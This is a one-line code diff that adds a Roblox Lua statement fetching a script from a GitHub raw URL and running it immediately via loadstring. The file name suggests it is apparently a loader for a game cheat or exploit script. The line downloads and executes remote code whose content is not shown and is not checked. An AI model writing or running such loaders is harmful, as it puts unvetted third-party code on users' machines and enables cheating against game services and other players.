@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/animal-hospital-anomaly-spam3-0rjkhoxqmk9zwd.lua"))()
